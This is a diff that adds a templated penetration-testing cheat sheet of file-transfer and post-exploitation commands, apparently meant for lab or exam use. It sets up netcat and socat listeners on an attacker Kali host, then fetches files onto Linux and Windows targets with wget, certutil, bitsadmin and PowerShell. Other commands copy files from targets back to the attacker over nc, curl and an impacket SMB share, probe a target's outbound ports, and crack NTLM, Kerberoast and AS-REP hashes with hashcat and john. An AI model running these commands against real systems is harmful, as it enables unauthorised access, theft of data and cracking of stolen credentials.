@@ -1,0 +1,71 @@
+# === KALI: START LISTENERS & SERVERS ===
+# HTTP server (serve files to target)
+python3 -m http.server {{KALI_PORT}}
+# Netcat listener
+rlwrap nc -nvlp {{KALI_PORT}}
+# Socat listener (better TTY)
+socat file:`tty`,raw,echo=0 tcp-listen:{{KALI_PORT}}
+
+# === LINUX TARGET: DOWNLOAD FROM KALI ===
+wget http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}} -O /tmp/{{FILENAME}}
+curl http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}} -o /tmp/{{FILENAME}}
+# Python fallback
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}', '/tmp/{{FILENAME}}')"
+
+# === LINUX TARGET: UPLOAD TO KALI ===
+# Start upload receiver on Kali first: nc -lvnp {{KALI_PORT}} > received_file
+nc {{KALI}} {{KALI_PORT}} < /path/to/file
+curl -T /path/to/file http://{{KALI}}:{{KALI_PORT}}/
+# Base64 encode for copy-paste
+base64 /path/to/file | tr -d '\n'
+# Decode on Kali
+echo '<BASE64>' | base64 -d > outfile
+
+# === WINDOWS TARGET: DOWNLOAD FROM KALI ===
+# PowerShell IWR
+Invoke-WebRequest -Uri "http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}" -OutFile "C:\Windows\Temp\{{FILENAME}}"
+# PowerShell WebClient
+(New-Object System.Net.WebClient).DownloadFile("http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}", "C:\Windows\Temp\{{FILENAME}}")
+# certutil (no PowerShell needed)
+certutil -urlcache -split -f "http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}" C:\Windows\Temp\{{FILENAME}}
+# bitsadmin
+bitsadmin /transfer job /download /priority normal "http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}" "C:\Windows\Temp\{{FILENAME}}"
+
+# === WINDOWS TARGET: UPLOAD TO KALI ===
+# PowerShell PUT (start python3 -m uploadserver on Kali)
+Invoke-WebRequest -Uri "http://{{KALI}}:{{KALI_PORT}}/upload" -Method POST -InFile "C:\path\to\file"
+# Base64 encode for copy-paste
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\file"))
+# SMB share from Kali (impacket): sudo impacket-smbserver share . -smb2support
+copy C:\path\to\file \\{{KALI}}\share\
+
+# === KALI: SMB SHARE FOR WINDOWS TRANSFERS ===
+# Start share (serves current directory)
+sudo impacket-smbserver share . -smb2support
+sudo impacket-smbserver share . -smb2support -username {{USER}} -password {{PASS}}
+# On Windows target
+copy \\{{KALI}}\share\{{FILENAME}} C:\Windows\Temp\
+net use Z: \\{{KALI}}\share /user:{{USER}} {{PASS}}
+
+# === SCP (when SSH is available) ===
+scp {{USER}}@{{TARGET}}:/path/to/file /tmp/
+scp /local/file {{USER}}@{{TARGET}}:/tmp/
+scp -i {{KEY_FILE}} {{USER}}@{{TARGET}}:/path/to/file /tmp/
+
+# === FIND EGRESS PORTS (run on target - identify which ports reach Kali) ===
+# Linux
+for port in 21 22 80 139 443 445 8080 8443; do wget -O /dev/null -T1 -t1 http://{{KALI}}:$port 2>&1 | grep -v "refused" && echo "Port $port reachable"; done
+# Windows
+foreach ($port in @(21,22,80,139,443,445,8080,8443)) { try { $t = New-Object System.Net.Sockets.TcpClient("{{KALI}}",$port); Write-Host "Port $port reachable"; $t.Close() } catch {} }
+
+# === HASH CRACKING (Kali) ===
+# NTLM
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+# NetNTLMv2
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+# Kerberoast
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+# AS-REP
+hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
+# MD5crypt / SHA512crypt (Linux shadow)
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
